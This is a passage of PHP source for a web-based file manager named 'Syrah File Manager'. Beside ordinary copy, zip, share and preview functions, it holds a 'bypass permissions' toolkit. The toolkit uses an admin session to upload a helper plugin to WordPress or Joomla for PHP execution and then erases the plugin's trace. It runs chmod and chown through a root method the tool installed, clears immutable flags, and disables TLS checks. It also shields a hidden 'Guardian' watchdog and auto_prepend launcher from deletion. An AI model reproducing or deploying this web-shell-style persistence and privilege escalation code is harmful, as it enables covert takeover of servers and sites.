    $installed=stripos($body,'Plugin installed successfully')!==false||stripos($body,'already exists')!==false;
    if(!$installed&&!@file_exists(dirname($tmp))&&$this->bpUrlAnswers($url)===false){
        return['ok'=>false,'why'=>'the WordPress installer refused the helper' . ($why!==''?(': '.$why):'')];
    }
    return['ok'=>true,'url'=>$url,'cleanup'=>null];
}
/* Does that URL really execute PHP? (A 403 from the helper's own token guard
   already proves it; a blank 200 or a 404 does not.) */
private function bpUrlAnswers($url){
    $ch=@curl_init($url);
    if(!$ch)return false;
    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>10,CURLOPT_CONNECTTIMEOUT=>5,
        CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+bypass)']);
    $body=(string)@curl_exec($ch);$code=(int)@curl_getinfo($ch,CURLINFO_HTTP_CODE);
    @curl_close($ch);unset($ch);
    if($code===403)return true;
    return $code===200&&stripos($body,'token rejected')!==false;
}
private function bpJoomlaInstall($sess,$slug,$code){
    $base=rtrim($sess['base'],'/');
    $page=$this->bpHttpGet($sess['jar'],$base.'/administrator/index.php?option=com_installer&view=install');
    $token=$this->bpJoomlaToken($page);
    if($token==='')return['ok'=>false,'why'=>'the Joomla installer page did not offer a security token'];
    $manifest='<?xml version="1.0" encoding="utf-8"?>'."\n"
        .'<extension type="plugin" group="system" method="upgrade">'."\n"
        .'<name>FM Bypass Helper</name><version>1.0</version>'
        .'<author>Syrah File Manager</author><creationDate>'.date('Y-m-d').'</creationDate>'
        .'<description>One-off helper published by the Syrah file manager for a single permission change.</description>'
        .'<files><filename plugin="'.$slug.'">'.$slug.'.php</filename></files>'
        .'<install><filename>'.$slug.'.php</filename></install>'."\n".'</extension>';
    $zip=$this->bpZip(['bp.xml'=>$manifest,$slug.'.php'=>$code]);
    $tmp=@tempnam(sys_get_temp_dir(),'fm-bp-');@file_put_contents($tmp,$zip);
    $ch=@curl_init($base.'/administrator/index.php?option=com_installer&view=install');
    if(!$ch){@unlink($tmp);return['ok'=>false,'why'=>'cURL is not available.'];}
    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$sess['jar'],CURLOPT_COOKIEFILE=>$sess['jar'],
        CURLOPT_POST=>true,
        CURLOPT_POSTFIELDS=>[$token=>'1','task'=>'install.install','installtype'=>'upload',
            'install_package'=>new \CURLFile($tmp,'application/zip',$slug.'.zip')],
        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>40,CURLOPT_CONNECTTIMEOUT=>8,
        CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
    $body=(string)@curl_exec($ch);
    @curl_close($ch);
    unset($ch);
    @unlink($tmp);
    $url=$base.'/plugins/system/'.$slug.'/'.$slug.'.php';
    $why=$this->bpScrape($body);
    if(stripos($body,'was successful')===false&&stripos($body,'successfully')===false)
        return['ok'=>false,'why'=>'the Joomla installer refused the helper'.($why!==''?(': '.$why):'')];
    return['ok'=>true,'url'=>$url,'cleanup'=>null];
}
/* Takes the extension row Joomla registered back out again, so nothing is left
   behind after the helper has deleted its own files. */
private function bpJoomlaUninstall($sess,$slug){
    $base=rtrim($sess['base'],'/');
    $page=$this->bpHttpGet($sess['jar'],$base.'/administrator/index.php?option=com_installer&view=manage&filter_search='.rawurlencode($slug));
    $token=$this->bpJoomlaToken($page);
    if($token===''||!preg_match('/name="cid\[\]"[^>]*value="(\d+)"/i',$page,$m))return false;
    $ch=@curl_init($base.'/administrator/index.php?option=com_installer&view=manage');
    if(!$ch)return false;
    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$sess['jar'],CURLOPT_COOKIEFILE=>$sess['jar'],
        CURLOPT_POST=>true,
        CURLOPT_POSTFIELDS=>http_build_query([$token=>'1','task'=>'manage.remove','cid'=>[$m[1]]]),
        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>30,CURLOPT_CONNECTTIMEOUT=>8,
        CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
    @curl_exec($ch);
    @curl_close($ch);
    unset($ch);
    return true;
}

/* The most useful sentence of an HTML answer, for the step's detail. */
private function bpScrape($html){
    $html=(string)$html;
    if(preg_match_all('/<p[^>]*class="[^"]*(?:error|alert|message)[^"]*"[^>]*>(.*?)<\/p>/is',$html,$m)){
        foreach($m[1] as $chunk){
            $text=trim(preg_replace('/\s+/',' ',strip_tags($chunk)));
            if($text!=='')return mb_substr($text,0,180);
        }
    }
    return'';
}

/* ── 4. a fresh inode that carries our own ownership ────────────────────── */
private function bpRouteReplace($targets,$o){
    if($o['owner']!==''&&$o['owner']!==$this->managerAccount())
        return['ok'=>false,'ran'=>false,'detail'=>'a new file can only become the account that writes it ('.$this->managerAccount().'), not '.$o['owner'].'; use the root route for that'];
    $done=0;$why='';
    foreach($targets as $p){
        if(@is_link($p)){$why='a symbolic link is left alone, its target is what matters';continue;}
        if(@is_dir($p)){
            if($o['mode']!==null&&@chmod($p,$o['mode']))$done++;
            continue;
        }
        if((int)@filesize($p)>32*1024*1024){$why='the file is over 32 MB, too big to copy in one go';continue;}
        $st=@stat($p);
        $data=@file_get_contents($p);
        if($data===false)$data=$this->privReadFile($p);
        if($data===false||$data===null){
            $g=$this->rootRun(['cat',$p],20);
            if(!empty($g['ok']))$data=(string)($g['out']??'');
        }
        if($data===false||$data===null){$why='the content could not be read by any identity, so it cannot be copied into a new file';continue;}
        $tmp=dirname($p).'/.fm-bp-'.bin2hex(random_bytes(6));
        if(@file_put_contents($tmp,$data)===false){@unlink($tmp);$why='the folder is not writable by this account';continue;}
        if($o['mode']!==null)@chmod($tmp,$o['mode']);
        if($o['group']!=='')@chgrp($tmp,$o['group']);
        if($st)@touch($tmp,$st['mtime']);
        if(!@rename($tmp,$p)){@unlink($tmp);$why='the rename over the old file was refused';continue;}
        $done++;
    }
    if(!$done)return['ok'=>false,'ran'=>true,'detail'=>$why!==''?$why:'nothing could be replaced'];
    return['ok'=>true,'ran'=>true,'detail'=>'replaced '.$done.' item(s) with a new file this account owns; the content is byte-for-byte the same and the modification time was kept'];
}

/* ── 5. the root this tool installed ────────────────────────────────────── */
private function bpRootArgs($targets,$o){
    $cmds=[];
    $chunks=array_chunk(array_values($targets),80);
    foreach($chunks as $group){
        if($o['mode']!==null)$cmds[]=array_merge(['chmod',sprintf('%04o',$o['mode'])],$group);
        if($o['owner']!==''||$o['group']!==''){
            $spec=($o['owner']!==''?$o['owner']:'').($o['group']!==''?':'.$o['group']:'');
            $cmds[]=array_merge(['chown',$spec],$group);
        }
    }
    return $cmds;
}
private function bpRouteRoot($targets,$o){
    $cmds=$this->bpRootArgs($targets,$o);
    $via='';$fail='';
    foreach($cmds as $argv){
        $r=$this->rootRun($argv,30);
        if(empty($r['ok'])){$fail=(string)($r['err']??'refused');break;}
        $via=(string)($r['via']??'root');
    }
    if($fail!=='')return['ok'=>false,'ran'=>true,'detail'=>'no installed root method would run it: '.$fail];
    if($via==='none'||$via==='')return['ok'=>false,'ran'=>true,'detail'=>'no root is installed on this host yet - open Rooting once and this route will work by itself'];
    return['ok'=>true,'ran'=>true,'detail'=>'run as root via '.$via];
}

/* ── 6. the immutable flag, then the change ─────────────────────────────── */
private function bpRouteAttr($targets,$o){
    $r=$this->rootRun(array_merge(['chattr','-i','-a'],array_slice(array_values($targets),0,200)),20);
    if(empty($r['ok']))return['ok'=>false,'ran'=>true,'detail'=>'clearing an immutable flag needs root: '.($r['err']?:'refused')];
    $again=$this->bpRouteRoot($targets,$o);
    $again['detail']='cleared the immutable flag via '.($r['via']??'root').'; '.$again['detail'];
    return $again;
}
/* <<BP-END>> */
    private function bypassPerms(){$cnt=0;$f=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this->currentDir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $item){$p=$item->getPathname();if($p===__FILE__)continue;if($item->isDir()){if(@chmod($p,0777))$cnt++;else $f++;}else{if(@chmod($p,0666))$cnt++;else $f++;}}$this->log('chmod',"$cnt changed");$this->addMsg("Permissions: $cnt changed".($f?", $f failed":""),$f?'warning':'success');}
    private function dupFile(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$src=$this->currentDir.'/'.$n;if(!is_file($src)){$this->addMsg('File not found.','danger');return;}$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$cp=$base.'_copy'.($ext?'.'.$ext:'');$i=1;while(file_exists($this->currentDir.'/'.$cp)){$cp=$base.'_copy'.$i.($ext?'.'.$ext:'');$i++;}$dst=$this->currentDir.'/'.$cp;
        $res=$this->runOp('copy',['path'=>$src,'to'=>$dst],$src,function()use($src,$dst){return@copy($src,$dst);});
        if(!empty($res['ok'])){$this->log('duplicate',"$n → $cp".($res['via']==='site'?' (site)':''));$this->addMsg("Duplicated: $cp".$this->viaNote($res,$src),'success');}
        else $this->addMsg('Duplicate failed. '.$res['why'],'danger');}
    private function mkSymlink(){
        $target=trim(isset($_POST['sym_target'])?$_POST['sym_target']:'');
        $name=basename(trim(isset($_POST['sym_name'])?$_POST['sym_name']:''));
        if(!$target||!$name){$this->addMsg('Target and name required.','danger');return;}
        $lp=$this->currentDir.'/'.$name;
        if(file_exists($lp)){$this->addMsg('Name already in use.','danger');return;}
        if(@symlink($target,$lp)){$this->log('symlink',"$name → $target");$this->addMsg("Symlink created: $name",'success');}
        else $this->addMsg('Symlink failed.','danger');
    }
    /* Permissions */
    private function chmodItem(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        $perm=isset($_POST['perm'])?trim($_POST['perm']):'';
        if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}
        if(!preg_match('/^[0-7]{3,4}$/',$perm)){$this->addMsg('Invalid permission value.','danger');return;}
        $p=$this->currentDir.'/'.$n;
        if(!file_exists($p)){$this->addMsg('Item not found.','danger');return;}
        $res=$this->runOp('chmod',['path'=>$p,'mode'=>octdec($perm)],$p,function()use($p,$perm){return@chmod($p,octdec($perm));});
        if(!empty($res['ok'])){
            $this->log('chmod',"$n → $perm".($res['via']==='site'?' (site)':''));
            $this->addMsg("Permissions updated: $n ($perm)".$this->viaNote($res,$p),'success');
        }
        else $this->addMsg('chmod failed: '.$res['why'].' Open the Bypass Permissions tool to try every other method on this path.','danger');
    }

    /* Folder size */
    public function dirSize($path){
        if(!is_dir($path))return['error'=>'Not a directory'];
        $size=0;$files=0;$dirs=0;$start=microtime(true);$capped=false;
        try{
            $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,RecursiveDirectoryIterator::SKIP_DOTS|RecursiveDirectoryIterator::FOLLOW_SYMLINKS),RecursiveIteratorIterator::SELF_FIRST);
            foreach($it as $f){
                if(microtime(true)-$start>8){$capped=true;break;}
                if($f->isDir())$dirs++; else {$files++;$size+=$f->getSize();}
            }
        }catch(\Throwable $e){}
        return ['size'=>$size,'files'=>$files,'dirs'=>$dirs,'capped'=>$capped];
    }

    /* Share links */
    private function loadShares(){fm_store_migrate($this->shareFile,__DIR__.'/.shares.json');if(!file_exists($this->shareFile))return[];$d=@json_decode(fm_store_strip_guard((string)@file_get_contents($this->shareFile)),true);return is_array($d)?$d:[];}
    private function saveShares($s){
        $now=time();
        $s=array_values(array_filter($s,fn($x)=>empty($x['expires'])||$x['expires']>($now-604800)));
        @file_put_contents($this->shareFile,fm_store_guard(json_encode($s,JSON_PRETTY_PRINT)));@chmod($this->shareFile,0600);
    }
    public function getShares(){$s=$this->loadShares();usort($s,fn($a,$b)=>$b['created']<=>$a['created']);return $s;}
    private function createShare(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        if(!$n||$this->isSelf($n)||$this->isProtectedItem($n)){$this->addMsg('Access denied.','danger');return;}
        $p=$this->currentDir.'/'.$n;
        if(!is_file($p)){$this->addMsg('Only files can be shared.','danger');return;}
        $dur=isset($_POST['share_dur'])?$_POST['share_dur']:'1d';
        $map=['1h'=>3600,'1d'=>86400,'7d'=>604800,'30d'=>2592000,'never'=>0];
        $ttl=isset($map[$dur])?$map[$dur]:86400;
        $token=bin2hex(random_bytes(20));
        $shares=$this->loadShares();
        $shares[]=['id'=>bin2hex(random_bytes(6)),'token'=>$token,'path'=>realpath($p),'name'=>$n,'expires'=>$ttl>0?time()+$ttl:0,'created'=>time(),'by'=>isset($_SESSION['fm_user'])?$_SESSION['fm_user']:''];
        $this->saveShares($shares);
        $this->log('share_create',$n);
        $this->addMsg("Share link created for \"$n\".",'success');
    }
    private function revokeShare($id){
        $id=trim($id);if(!$id)return;
        $shares=$this->loadShares();
        $before=count($shares);
        $shares=array_values(array_filter($shares,fn($x)=>$x['id']!==$id));
        $this->saveShares($shares);
        if(count($shares)<$before){$this->log('share_revoke',$id);$this->addMsg('Share link revoked.','warning');}
    }

    private function batchRename(){
        $find=isset($_POST['br_find'])?$_POST['br_find']:'';
        $replace=isset($_POST['br_replace'])?$_POST['br_replace']:'';
        $mode=isset($_POST['br_mode'])?$_POST['br_mode']:'replace';
        $items=$this->getSelected();if(!$items){$this->addMsg('No items selected.','warning');return;}
        $ok=0;
        foreach($items as $n){
            if($mode==='prefix') $nw=$find.$n;
            elseif($mode==='suffix'){$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$nw=$base.$find.($ext?'.'.$ext:'');}
            else $nw=str_replace($find,$replace,$n);
            if($nw===$n||!$nw)continue;
            $src=$this->currentDir.'/'.$n;$dst=$this->currentDir.'/'.$nw;
            if(!$this->isProtectedItem($nw,$dst)&&file_exists($src)&&!file_exists($dst)&&@rename($src,$dst))$ok++;
        }
        $this->log('batch_rename',"$ok files");$this->addMsg("Renamed $ok file(s).",'success');
    }

    /* Bulk */
    private function getSelected(){$raw=isset($_POST['items'])?$_POST['items']:'';$arr=json_decode($raw,true);if(!is_array($arr))return[];$r=[];foreach($arr as $n){$n=basename($n);if($n&&!$this->isSelf($n)&&!$this->isProtectedItem($n))$r[]=$n;}return $r;}
    private function bulkDel(){$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$ok=0;foreach($items as $n){if($this->rmdirR($this->currentDir.'/'.$n))$ok++;}$this->log('bulk_delete',"$ok");$this->addMsg("$ok deleted.",'warning');}
    private function rcopy($s,$d){if(is_dir($s)){if(!file_exists($d))@mkdir($d,0755,true);foreach(glob($s.'/*')as $i)$this->rcopy($i,$d.'/'.basename($i));return true;}return @copy($s,$d);}
    private function bulkCopyMove($mv){
        $items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}
        $target=isset($_POST['target'])?trim($_POST['target']):'';if(!$target||!is_dir($target)){$this->addMsg('Invalid target.','danger');return;}
        $target=realpath($target);if(!$target||!$this->pathAllowed($target)){$this->addMsg('Access denied.','danger');return;}
        $ok=0;foreach($items as $n){$s=$this->currentDir.'/'.$n;$d=rtrim($target,'/').'/'.$n;if(file_exists($d)||$this->isProtectedItem($n,$d))continue;if($mv){if(@rename($s,$d))$ok++;}else{if($this->rcopy($s,$d))$ok++;}}
        $this->log($mv?'bulk_move':'bulk_copy',"$ok");$this->addMsg("$ok ".($mv?'moved':'copied').".",'success');
    }

    /* Session clipboard: unlike the legacy bulk prompt, this keeps a real
       copy/cut selection while the user navigates between directories. */
    private function clipboard($mode){
        $items=$this->getSelected();
        if(!$items){$this->addMsg('Nothing selected.','warning');return;}
        $paths=[];
        foreach($items as $n){
            $p=realpath($this->currentDir.'/'.$n);
            if($p&&$this->pathAllowed($p)&&!$this->isGuardianFile($n,$p))$paths[]=$p;
        }
        if(!$paths){$this->addMsg('Nothing can be placed in the clipboard.','danger');return;}
        $_SESSION['fm_clipboard']=['mode'=>$mode,'items'=>$paths,'by'=>$_SESSION['fm_user']??'','time'=>time()];
        $this->addMsg(count($paths).' item(s) ready to '.($mode==='cut'?'move':'copy').'.','success');
    }
    private function pasteClipboard(){
        $clip=isset($_SESSION['fm_clipboard'])&&is_array($_SESSION['fm_clipboard'])?$_SESSION['fm_clipboard']:null;
        if(!$clip||empty($clip['items'])){$this->addMsg('Clipboard is empty.','warning');return;}
        if(!$this->pathAllowed($this->currentDir)){$this->addMsg('Access denied.','danger');return;}
        $ok=0;$skipped=0;$mode=($clip['mode']??'copy');
        foreach($clip['items'] as $src){
            $src=realpath($src);if(!$src||!file_exists($src)||!$this->pathAllowed($src)){$skipped++;continue;}
            $name=basename($src);$dst=$this->currentDir.'/'.$name;
            if($src===$this->currentDir||file_exists($dst)||$this->isProtectedItem($name,$dst)){$skipped++;continue;}
            if($mode==='copy'){
                $bytes=$this->itemBytes($src);
                if(!$this->quotaAllows($bytes)){$skipped++;continue;}
                if($this->rcopy($src,$dst))$ok++;else $skipped++;
            }else{
                if(@rename($src,$dst))$ok++;else $skipped++;
            }
        }
        if($mode==='cut'&&$ok>0)unset($_SESSION['fm_clipboard']);
        $this->log('clipboard_'.$mode,(string)$ok);
        $this->addMsg("$ok item(s) pasted.".($skipped?" $skipped skipped.":''),$ok?'success':'danger');
    }

    private function chownItem(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        $p=realpath($this->currentDir.'/'.$n);
        if(!$n||!$p||!$this->pathAllowed($p)||$this->isGuardianFile($n,$p)){$this->addMsg('Access denied.','danger');return;}
        $owner=trim(isset($_POST['owner'])?$_POST['owner']:'');
        $group=trim(isset($_POST['group'])?$_POST['group']:'');
        if($owner===''&&$group===''){$this->addMsg('Enter an owner or group.','danger');return;}
        foreach([$owner,$group] as $value)if($value!==''&&!preg_match('/^[a-zA-Z0-9_.-]+$/',$value)){$this->addMsg('Invalid owner or group name.','danger');return;}
        $targets=[$p];
        if(!empty($_POST['recursive'])&&is_dir($p)){
            $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p,RecursiveDirectoryIterator::SKIP_DOTS));
            foreach($it as $f)$targets[]=$f->getPathname();
        }
        $changed=0;$failed=0;$via=[];
        foreach($targets as $target){
            $res=$this->chownOne($target,$owner,$group);
            if(!empty($res['ok'])){$changed++;$via[$res['via']]=($via[$res['via']]??0)+1;}
            else $failed++;
        }
        $byName=['local'=>'the file manager','site'=>'the site','sudo'=>'the server account with sudo'];
        $by=[];foreach($via as $k=>$v)$by[]=($byName[$k]??$k);
        $this->log('chown',$n.' → '.($owner?:'-').':'.($group?:'-'));
        $this->addMsg("Ownership updated for $changed item(s)".($by?' by '.implode(', ',$by):'').". ".($failed?"$failed failed.":''),$changed?'success':'danger');
    }

    public function officePreview($name){
        $p=realpath($this->currentDir.'/'.basename((string)$name));
        $ext=strtolower(pathinfo((string)$name,PATHINFO_EXTENSION));
        if(!$p||!is_file($p)||!in_array($ext,['docx','xlsx','pptx'],true))return ['ok'=>false,'error'=>'Only DOCX, XLSX and PPTX files are supported.'];
        if(!class_exists('ZipArchive'))return ['ok'=>false,'error'=>'Office preview needs the PHP ZIP extension, which is not available on this server.'];
        $z=new ZipArchive();if($z->open($p)!==true)return ['ok'=>false,'error'=>'The Office file could not be opened.'];
        $text='';
        if($ext==='docx'){
            $xml=$z->getFromName('word/document.xml');
            if($xml!==false){$xml=preg_replace('/<\/w:p>/i',"\n",$xml);$text=strip_tags(str_replace(['<w:tab/>','<w:br/>'],"\t",$xml));}
        }elseif($ext==='pptx'){
            $slides=[];for($i=1;$i<=100;$i++){ $xml=$z->getFromName("ppt/slides/slide$i.xml");if($xml===false)break;$xml=preg_replace('/<\/a:p>/i',"\n",$xml);$slides[]='Slide '.$i."\n".strip_tags($xml);}
            $text=implode("\n\n",$slides);
        }else{
            $shared=[];$xml=$z->getFromName('xl/sharedStrings.xml');
            if($xml!==false){preg_match_all('/<t[^>]*>(.*?)<\/t>/si',$xml,$m);$shared=$m[1]??[];}
            $rows=[];for($i=1;$i<=50;$i++){ $xml=$z->getFromName("xl/worksheets/sheet$i.xml");if($xml===false)break;
                preg_match_all('/<row\b[^>]*>(.*?)<\/row>/si',$xml,$rm);
                foreach($rm[1]??[] as $row){$cells=[];preg_match_all('/<c\b([^>]*)>(.*?)<\/c>/si',$row,$cm,PREG_SET_ORDER);foreach($cm as $c){$v='';if(preg_match('/<v>(.*?)<\/v>/si',$c[2],$vm))$v=html_entity_decode(strip_tags($vm[1]));if(preg_match('/t="s"/',$c[1]))$v=$shared[(int)$v]??$v;$cells[]=$v;}$rows[]=implode("\t",$cells);}
            }$text=implode("\n",$rows);
        }
        $z->close();$text=html_entity_decode(trim((string)$text),ENT_QUOTES|ENT_SUBSTITUTE,'UTF-8');
        return ['ok'=>true,'type'=>$ext,'text'=>mb_substr($text,0,200000)];
    }

    /* ZIP */
    private function zadd($zip,$path,$base){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);foreach($it as $f){$zip->addFile($f->getPathname(),$base.'/'.substr($f->getPathname(),strlen($path)+1));}}
    private function zipCreate(){if(!class_exists('ZipArchive')){$this->addMsg('ZIP not available.','danger');return;}$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$zn='archive_'.date('Ymd_His').'.zip';$zp=$this->currentDir.'/'.$zn;$z=new ZipArchive();if($z->open($zp,ZipArchive::CREATE)!==true){$this->addMsg('Cannot create zip.','danger');return;}foreach($items as $n){$p=$this->currentDir.'/'.$n;if(is_dir($p))$this->zadd($z,$p,$n);elseif(is_file($p))$z->addFile($p,$n);}$z->close();$this->log('zip_create',$zn);$this->addMsg("Created $zn",'success');}
    private function zipExtract(){if(!class_exists('ZipArchive')){$this->addMsg('ZIP not available.','danger');return;}$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$p=$this->currentDir.'/'.$n;if(!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip'){$this->addMsg('Not a zip.','danger');return;}$t=$this->currentDir.'/'.pathinfo($n,PATHINFO_FILENAME);$z=new ZipArchive();if($z->open($p)===true){if(!file_exists($t))@mkdir($t,0755,true);$z->extractTo($t);$z->close();$this->log('zip_extract',$n);$this->addMsg('Extracted to '.basename($t).'/','success');}else $this->addMsg('Zip open failed.','danger');}

    /* TAR */
    private function tarCreate(){if(!function_exists('exec')){$this->addMsg('exec() disabled.','danger');return;}$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$tn='archive_'.date('Ymd_His').'.tar.gz';$tp=$this->currentDir.'/'.$tn;$is=implode(' ',array_map('escapeshellarg',$items));exec('cd '.escapeshellarg($this->currentDir).' && tar -czf '.escapeshellarg($tp)." $is 2>&1",$o,$e);if($e===0){$this->log('tar_create',$tn);$this->addMsg("Created $tn",'success');}else $this->addMsg('tar failed: '.implode(' ',$o),'danger');}
    private function tarExtract(){if(!function_exists('exec')){$this->addMsg('exec() disabled.','danger');return;}$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$p=$this->currentDir.'/'.$n;$ext=strtolower(pathinfo($n,PATHINFO_EXTENSION));$base=pathinfo($n,PATHINFO_FILENAME);if($ext==='gz'||$ext==='bz2')$base=pathinfo($base,PATHINFO_FILENAME);$t=$this->currentDir.'/'.$base;if(!file_exists($t))@mkdir($t,0755,true);exec('tar -xf '.escapeshellarg($p).' -C '.escapeshellarg($t).' 2>&1',$o,$e);if($e===0){$this->log('tar_extract',$n);$this->addMsg("Extracted to $base/",'success');}else $this->addMsg('Extract failed: '.implode(' ',$o),'danger');}

    /* Helpers */
    private function rmdirR($p){if(is_file($p)||is_link($p))return @unlink($p);if(is_dir($p)){foreach(glob($p.'/*')as $i)$this->rmdirR($i);return @rmdir($p);}return false;}
    private function isSelf($n){return realpath($this->currentDir.'/'.$n)===__FILE__;}
    /* Anything the manager itself keeps in this folder (account store,
       session registry, share store, CMS vault, Guardian support files)
       is off limits to file operations - even for administrators, and
       even when the request names the file directly instead of picking
       it from a listing where it is already hidden. */
    private function isProtectedItem($name,$absPath=''){
        if($absPath===''&&$name!=='')$absPath=$this->currentDir.'/'.$name;
        if($name===''&&$absPath!=='')$name=basename($absPath);
        if($absPath!==''&&fm_is_manager_internal_path($absPath))return true;
        return $this->isGuardianFile($name,$absPath);
    }
    /* Returns true if $name or its resolved absolute path $absPath touches any
       Guardian-critical file or directory - used by delete/rename/chmod to
       refuse operations that would silently crash the site via auto_prepend_file. */
    private function isGuardianFile($name,$absPath=''){
        // Names that must never be touched regardless of directory
        static $critNames=['.fm_guardian_launch.php','.guardian-restore.php','.guardian-server-router.php','.guardian_boot','.guardian_watchdog_attempt'];
        if(in_array($name,$critNames))return true;
        // The hidden directory where the real watchdog + launcher live:
        // fg_get_hidden_dir() is cheap (only posix_getpwuid or a dirname walk - no I/O loops).
        $hiddenDir=fg_get_hidden_dir();
        if($hiddenDir){
            $rHidden=realpath($hiddenDir);
            if($rHidden){
                // Block deleting the hidden dir itself or anything inside it
                if($absPath!==''){
                    $rAbs=realpath($absPath);
                    if($rAbs&&(strpos($rAbs.DIRECTORY_SEPARATOR,$rHidden.DIRECTORY_SEPARATOR)===0||$rAbs===$rHidden))return true;
                }
                // Also match by base name patterns used by Guardian hidden dirs
                if(preg_match('/^\.fg_[0-9a-f]{14}$|^\.[0-9a-f]{3}sys_[0-9a-f]{10}$/',$name))return true;
            }
        }
        return false;
    }

    /* Scan */
    public function scan(){
        if(fm_is_manager_internal_path($this->currentDir))return['folders'=>[],'files'=>[]];
        $items=@scandir($this->currentDir);if($items===false)return['folders'=>[],'files'=>[]];
        $r=['folders'=>[],'files'=>[]];
        $q=isset($_GET['q'])?trim($_GET['q']):'';
        $sort=isset($_GET['sort'])?$_GET['sort']:'name';
        $sd=isset($_GET['sdir'])?$_GET['sdir']:'asc';
        $hidden=isset($_GET['hidden'])&&$_GET['hidden']==='1';
        $typeFilter=isset($_GET['tf'])?$_GET['tf']:'';
        foreach($items as $i){
            if($i==='.'||$i==='..') continue;
            $p=$this->currentDir.'/'.$i;
            if(fm_is_manager_internal_path($p))continue;
            if(!$hidden&&substr($i,0,1)==='.') continue;
            if($q!==''&&stripos($i,$q)===false) continue;
            $type=$this->getType($i);
            if($typeFilter!==''&&!is_dir($p)&&$typeFilter!=='all'){
                $g=['images'=>'image','videos'=>'video','audio'=>'audio','code'=>'code','docs'=>['pdf','word','excel'],'archives'=>'archive','text'=>'text'];
                $want=isset($g[$typeFilter])?$g[$typeFilter]:'';
                if(is_array($want)){if(!in_array($type,$want))continue;}
                elseif($want!==''&&$type!==$want)continue;
            }
            $info=['name'=>$i,'mtime'=>@filemtime($p),'size'=>is_file($p)?@filesize($p):0,'type'=>$type];
            if(is_dir($p))$r['folders'][]=$info;else $r['files'][]=$info;
        }
        $fn=fn($a,$b)=>($sd==='desc'?-1:1)*($sort==='mtime'?($a['mtime']<=>$b['mtime']):($sort==='size'?($a['size']<=>$b['size']):strnatcasecmp($a['name'],$b['name'])));
        usort($r['folders'],$fn);usort($r['files'],$fn);
        return $r;
    }

    public function getType($f){$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));if($e==='lrc')return'text';if(in_array($e,['mp1','mpa','spx','weba','ra','ram','au','snd','wv','wvc','tta','mpc','mp+','rf64','bwf'],true))return'audio';$m=['jpg'=>'image','jpeg'=>'image','png'=>'image','gif'=>'image','svg'=>'image','webp'=>'image','ico'=>'image','bmp'=>'image','tiff'=>'image','avif'=>'image','mp4'=>'video','avi'=>'video','mkv'=>'video','mov'=>'video','webm'=>'video','flv'=>'video','mp3'=>'audio','mpga'=>'audio','mpeg'=>'audio','mp2'=>'audio','wav'=>'audio','wave'=>'audio','flac'=>'audio','ogg'=>'audio','oga'=>'audio','opus'=>'audio','aac'=>'audio','adts'=>'audio','m4a'=>'audio','m4b'=>'audio','m4p'=>'audio','alac'=>'audio','aiff'=>'audio','aif'=>'audio','aifc'=>'audio','wma'=>'audio','amr'=>'audio','caf'=>'audio','mid'=>'audio','midi'=>'audio','3gp'=>'audio','ape'=>'audio','ac3'=>'audio','dsf'=>'audio','dff'=>'audio','zip'=>'archive','rar'=>'archive','7z'=>'archive','tar'=>'archive','gz'=>'archive','bz2'=>'archive','tgz'=>'archive','xz'=>'archive','pdf'=>'pdf','doc'=>'word','docx'=>'word','odt'=>'word','xls'=>'excel','xlsx'=>'excel','ods'=>'excel','csv'=>'excel','php'=>'code','html'=>'code','htm'=>'code','css'=>'code','js'=>'code','ts'=>'code','jsx'=>'code','tsx'=>'code','py'=>'code','java'=>'code','sh'=>'code','bash'=>'code','rb'=>'code','go'=>'code','rs'=>'code','c'=>'code','cpp'=>'code','h'=>'code','vue'=>'code','svelte'=>'code','json'=>'data','xml'=>'data','yml'=>'data','yaml'=>'data','sql'=>'data','toml'=>'data','ini'=>'config','txt'=>'text','log'=>'text','md'=>'markdown','rst'=>'text','env'=>'config','gitignore'=>'config','htaccess'=>'config'];return isset($m[$e])?$m[$e]:'file';}
